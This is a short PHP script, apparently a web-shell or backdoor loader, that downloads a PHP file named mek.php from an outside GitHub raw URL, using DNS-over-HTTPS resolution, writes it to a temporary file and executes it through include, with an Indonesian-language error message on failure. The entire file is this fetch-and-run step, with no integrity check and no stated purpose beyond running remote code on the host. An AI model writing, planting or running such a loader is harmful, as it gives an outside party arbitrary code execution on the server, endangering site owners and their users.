<?php
$url = 'https://raw.githubusercontent.com/Jenderal92/KC5/refs/heads/master/mek.php';
$dns = 'https://cloudflare-dns.com/dns-query';

$ch = curl_init($url);

if (defined('CURLOPT_DOH_URL') && version_compare(curl_version()['version'], '7.62.0', '>=')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$res = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

if ($res && empty($err)) {
    $tmp = tmpfile();
    $path = stream_get_meta_data($tmp)['uri'];
    fwrite($tmp, $res);
    include($path);
    fclose($tmp);
} else {
    echo "Gagal mengambil file: $err";
}
?>
